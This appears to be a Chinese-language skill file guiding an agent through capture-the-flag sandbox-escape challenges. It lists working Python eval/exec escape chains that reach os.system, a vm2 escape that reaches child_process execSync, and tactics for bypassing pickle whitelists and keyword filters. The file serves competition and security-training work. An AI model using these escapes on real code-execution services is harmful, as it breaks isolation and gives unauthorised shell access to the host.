---
name: sandbox-escape
description: 题面是"在线代码执行服务(Python/JavaScript)+沙箱限制/隔离执行上下文/第三方沙箱组件/上传序列化对象且服务端还原(白名单限制)"时必读。沙箱逃逸与反序列化绕过检查单:Python exec/eval 沙箱逃逸原语、JS vm2/isolated-vm 等沙箱逃逸、pickle/序列化白名单绕过。
---

# 沙箱逃逸 / 受限代码执行 / 反序列化白名单

## Python 代码执行沙箱(eval/exec 过滤了危险名字或关键字)
逐级试(从内置对象出发总能到危险对象):
1. 基础逃逸:`__import__('os').system('id')`;被滤 import 时用 `__builtins__` 拿回
2. 从任何对象到基类链:`().__class__.__bases__[0]`(=object)→ `__subclasses__()` 遍历找危险类
   - 常见目标: `os._wrap_close`(其 `__init__.__globals__['system']`)、`warnings.catch_warnings`(globals 含 sys.modules)、`subprocess.Popen`
   - 例: `[c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__=='_wrap_close'][0].__init__.__globals__['system']('sh')`
3. 关键字被滤(如禁 `__class__`、禁引号):用 `getattr()` 拼、f-string 与 format 的 `{obj.__class__}`、`().__class__` 的十六进制/`chr()` 拼接、`().__reduce__` 之类间接
4. 只给了受限内置(如 `exec` 被替换/`eval` 加白名单 dict):从**已注入的辅助对象**找逃逸——每个对象的 `__globals__`/`__builtins__` 都可再拿全量内置
5. 网络/文件先探:`open('/challenge/flag.txt').read()`、`os.listdir('/')` 找 flag 路径;出网被禁就纯本地读

## JavaScript 执行沙箱(vm2/isolated-vm/sandboxed iframe 等)
1. 直接全局逃逸:vm2 老版本有公开 CVE(原型链污染/`this.constructor.constructor('return process')()`)
   - 通用链:`this.constructor.constructor("return process")().mainModule.require('child_process').execSync('id')`
2. 原型链污染:向 `__proto__`/`constructor.prototype` 注入属性影响宿主(题面给 hint 时按链走)
3. `Function`/`eval` 被隔离:找 `[].filter.constructor`(即 Function)等间接拿构造函数
4. 环境给出什么全局(require?process?Buffer?)先枚举:`Object.getOwnPropertyNames(globalThis)`

## 反序列化白名单(pickle 白名单类)
- Python pickle:`pickle.loads` 配 `find_class` 白名单 → 检查是否可从**白名单类自身属性**出发逃逸(类的 `__reduce__`、`__getstate__`、`__setstate__` 是否允许注入全局引用;白名单里若放了 `collections.OrderedDict`/`os` 相关类基本都能绕)
- 不 recalc:先读回显误差,构造 `pickle` 字节(可用 `pickletools` 拼 opcode),报错信息会泄露白名单类清单 → 针对可用类找链
- Java/其他语言序列化:看是否给了 ysoserial 类 gadget 线索;目标服务类型与依赖版本决定 gadget

## 通用纪律
- 每步小验证(执行无害命令如 `id`/读目录),别一上来就跑大 payload
- flag 常在某固定路径(`/challenge/flag.txt`、`/flag.txt`、环境变量),先列根目录与常见位置
